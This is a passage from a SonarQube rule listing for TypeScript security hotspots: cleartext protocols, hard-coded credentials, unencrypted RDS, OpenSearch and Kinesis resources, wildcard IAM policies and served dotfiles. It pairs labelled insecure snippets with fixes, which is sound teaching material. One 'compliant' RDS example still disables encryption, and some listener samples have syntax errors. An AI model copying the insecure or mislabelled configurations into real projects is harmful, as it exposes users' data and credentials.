href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new NetworkListener(this, 'listener-tcp-explicit-constructor', {
  loadBalancer: nlb,
  protocol: Protocol.TCP, // Sensitive
  port: 8080
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new CfnListener(this, 'listener-http', {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: "HTTP", // Sensitive
  port: 80
});

new CfnListener(this, 'listener-tcp', {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: "TCP", // Sensitive
  port: 80
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

new CfnLoadBalancer(this, 'elb-tcp', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'tcp' // Sensitive
  }]
});

new CfnLoadBalancer(this, 'elb-http', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'http' // Sensitive
  }]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

const loadBalancer = new LoadBalancer(this, 'elb-tcp-dict', {
    vpc,
    internetFacing: true,
    healthCheck: {
    port: 80,
    },
    listeners: [
    {
        externalPort:10000,
        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive
        internalPort:10000
    }]
});

loadBalancer.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive
  internalPort:10001
});
loadBalancer.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive
  internalPort:10002
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';

new CfnReplicationGroup(this, 'unencrypted-implicit', {
  replicationGroupDescription: 'exampleDescription'
}); // Sensitive

new CfnReplicationGroup(this, 'unencrypted-explicit', {
  replicationGroupDescription: 'exampleDescription',
  transitEncryptionEnabled: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from 'aws-cdk-lib/aws-kinesis';

new CfnStream(this, 'cfnstream-implicit-unencrytped', undefined); // Sensitive

new CfnStream(this, 'cfnstream-explicit-unencrytped', {
  streamEncryption: undefined // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from 'aws-cdk-lib/aws-kinesis';

new Stream(this, 'stream-explicit-unencrypted', {
  encryption: StreamEncryption.UNENCRYPTED // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<pre>
url = "https://example.com";
url = "sftp://anonymous@example.com";
url = "ssh://anonymous@example.com";
</pre>
<p>For <a href="https://nodemailer.com">nodemailer</a> one of the following options must be set:</p>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({
  secure: true,
  requireTLS: true,
  port: 465,
  secured: true
});
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp">ftp</a>:</p>
<pre>
var Client = require('ftp');
var c = new Client();
c.connect({
  'secure': true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const alb = new ApplicationLoadBalancer(this, 'ALB', {
  vpc: vpc,
  internetFacing: true
});

alb.addListener('listener-https-explicit', {
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});

alb.addListener('listener-https-implicit', {
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new ApplicationListener(this, 'listener-https-explicit', {
  loadBalancer: loadBalancer,
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const nlb = new NetworkLoadBalancer(this, 'nlb', {
  vpc: vpc,
  internetFacing: true
});

nlb.addListener('listener-tls-explicit', {
  protocol: Protocol.TLS,
  port: 1234,
  certificates: [certificate]
});

nlb.addListener('listener-tls-implicit', {
  port: 1234,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new NetworkListener(this, 'listener-tls-explicit', {
  loadBalancer: loadBalancer,
  protocol: Protocol.TLS,
  port: 8080,
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new CfnListener(this, 'listener-https', {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: "HTTPS",
  port: 80
  certificates: [certificate]
});

new CfnListener(this, 'listener-tls', {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: "TLS",
  port: 80
  certificates: [certificate]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';

new CfnLoadBalancer(this, 'elb-ssl', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'ssl',
    sslCertificateId: sslCertificateId
  }]
});

new CfnLoadBalancer(this, 'elb-https', {
  listeners: [{
    instancePort: '1000',
    loadBalancerPort: '1000',
    protocol: 'https',
    sslCertificateId: sslCertificateId
  }]
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer, LoadBalancingProtocol } from 'aws-cdk-lib/aws-elasticloadbalancing';

const lb = new LoadBalancer(this, 'elb-ssl', {
  vpc,
  internetFacing: true,
  healthCheck: {
    port: 80,
  },
  listeners: [
    {
      externalPort:10000,
      externalProtocol:LoadBalancingProtocol.SSL,
      internalPort:10000
    }]
});

lb.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.SSL,
  internalPort:10001
});
lb.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTPS,
  internalPort:10002
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';

new CfnReplicationGroup(this, 'encrypted-explicit', {
  replicationGroupDescription: 'example',
  transitEncryptionEnabled: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from 'aws-cdk-lib/aws-kinesis';

new Stream(this, 'stream-implicit-encrypted');

new Stream(this, 'stream-explicit-encrypted-selfmanaged', {
  encryption: StreamEncryption.KMS,
  encryptionKey: encryptionKey,
});

new Stream(this, 'stream-explicit-encrypted-managed', {
  encryption: StreamEncryption.MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from 'aws-cdk-lib/aws-kinesis';

new CfnStream(this, 'cfnstream-explicit-encrypted', {
  streamEncryption: {
    encryptionType: encryptionType,
    keyId: encryptionKey.keyId,
  }
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2068">
              typescript:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
var mysql = require('mysql');

var connection = mysql.createConnection(
{
  host:'localhost',
  user: "admin",
  database: "project",
  password: "mypassword", // sensitive
  multipleStatements: true
});

connection.connect();
</pre>
<h2>Compliant Solution</h2>
<pre>
var mysql = require('mysql');

var connection = mysql.createConnection({
  host: process.env.MYSQL_URL,
  user: process.env.MYSQL_USERNAME,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE
});
connection.connect();
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6303">
              typescript:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul>
  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>
  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>
</ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul>
  <li> theft of intellectual property and/or personal data </li>
  <li> extortion </li>
  <li> denial of services and security bypasses via data corruption or deletion </li>
</ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBCluster(this, 'example', {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBInstance(this, 'example', {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';
import { aws_ec2 as ec2 } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

const cluster = new rds.DatabaseCluster(this, 'example', {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, 'example', {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: 'exampleSnapshot',
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, 'example', {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, 'example', {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBCluster(this, 'example', {
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

new rds.CfnDBInstance(this, 'example', {
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

const cluster = new rds.DatabaseCluster(this, 'example', {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, 'example', {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: 'exampleSnapshot',
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, 'example', {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: true,
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from 'aws-cdk-lib';

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, 'example', {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: true,
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6302">
              typescript:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul>
  <li> only require a subset of these permissions to perform the intended function. </li>
  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["*"], // Sensitive
    resources: ["arn:aws:iam:::user/*"],
})
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: ["iam:GetAccountSummary"],
    resources: ["arn:aws:iam:::user/*"],
})
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-roles">Google Cloud Documentation</a> - Understanding roles </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6308">
              typescript:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul>
  <li> indices </li>
  <li> logs </li>
  <li> swap files </li>
  <li> data in the application directory </li>
  <li> automated snapshots </li>
</ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {
  version: EngineVersion.OPENSEARCH_1_3,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {
  engineVersion: 'OpenSearch_1.3',
}); // Sensitive, encryption must be explicitly enabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {
  version: EngineVersion.OPENSEARCH_1_3,
  encryptionAtRest: {
    enabled: true,
  },
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';

const exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {
  engineVersion: 'OpenSearch_1.3',
  encryptionAtRestOptions: {
    enabled: true,
  },
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5691">
              typescript:S5691
            </a>
          </td>
          <td>
            <details>
              <p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,
<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like
<code>ls</code>.</p>
<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded
secrets.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li>
  <li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this
  type of files. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Disable the serving of hidden files. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/serve-static">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic = require("serve-static");
let app = express();
let serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'allow'});   // Sensitive
app.use(serveStaticMiddleware);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/serve-static">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic = require("serve-static");
let app = express();
let serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'ignore'});   // Compliant: ignore or deny are recommended values
let serveStaticDefault = serveStatic('public', { 'index': false});   // Compliant: by default, "dotfiles" (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation
app.use(serveStaticMiddleware);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://github.com/mtojek/go-url-fuzzer">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
